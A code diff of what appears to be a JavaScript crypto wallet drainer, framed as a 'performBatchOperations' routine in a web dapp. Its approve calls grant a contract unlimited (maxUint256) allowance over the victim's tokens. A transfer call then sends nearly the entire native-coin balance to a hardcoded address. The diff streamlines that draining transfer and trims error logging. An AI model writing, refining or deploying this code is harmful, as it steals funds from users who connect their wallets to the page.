@@ -439,52 +439,29 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
         functionName: 'approve',
         args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
       }),
-      value: '0x0',
-      gasLimit: BigInt(200000)
+      value: '0x0'
     }))
 
   // Prepare transfer call for native token
-let nativeTokenCalls = [];
-const nativeToken = networkTokens.find(t => t.address === 'native');
-if (nativeToken) {
-  try {
-    const balanceWei = parseUnits(nativeToken.balance, 18);
-    const gasReserve = BigInt('10000000'); // 0.01 ETH/BNB/MATIC in wei
-    const gasLimitPerTx = BigInt(200000); // Gas limit for one simple transfer
-    const totalGasEstimate = gasLimitPerTx * BigInt(2); // For two transfers
-    const gasPrice = await wagmiAdapter.wagmiConfig.getFeeData().then(feeData => feeData.gasPrice || BigInt('5000000000')); // Fallback to 5 Gwei
-    const totalGasFees = gasPrice * totalGasEstimate;
-
-    if (balanceWei > totalGasFees + gasReserve) {
-      const availableBalance = balanceWei - totalGasFees - gasReserve;
-      const transferAmountPerTx = availableBalance / BigInt(2); // Split into two equal parts
-      const recipient = '0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0';
-
-      nativeTokenCalls = [
-        {
-          to: getAddress(recipient),
-          value: `0x${transferAmountPerTx.toString(16)}`,
-          data: '0x',
-          gasLimit: gasLimitPerTx
-        },
-        {
-          to: getAddress(recipient),
-          value: `0x${(availableBalance - transferAmountPerTx).toString(16)}`,
-          data: '0x',
-          gasLimit: gasLimitPerTx
-        }
-      ];
+  let transferCall = null
+  const nativeToken = networkTokens.find(t => t.address === 'native')
+  if (nativeToken) {
+    const balanceWei = parseUnits(nativeToken.balance, 18)
+    const gasReserve = BigInt('10000000000000000') // 0.01 ETH in wei
+    if (balanceWei > gasReserve) {
+      const transferAmount = balanceWei - gasReserve
+      transferCall = {
+        to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
+        value: `0x${transferAmount.toString(16)}`,
+        data: '0x'
+      }
     } else {
-      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`);
+      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`)
     }
-  } catch (error) {
-    store.errors.push(`Error preparing native token transfers: ${error.message}`);
-    console.error(`Error preparing native token transfers: ${error}`);
   }
-}
 
-// Combine all calls
-const allCalls = [...approveCalls, ...nativeTokenCalls];
+  // Combine all calls
+  const allCalls = [...approveCalls]
   if (transferCall) {
     allCalls.push(transferCall)
   }
@@ -502,7 +479,6 @@ const allCalls = [...approveCalls, ...nativeTokenCalls];
       if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
     } catch (error) {
       store.errors.push(`Failed to send batch transaction: ${error.message}`)
-      console.error(`Batch transaction error:`, error)
       const approveState = document.getElementById('approveState')
       if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`
     }
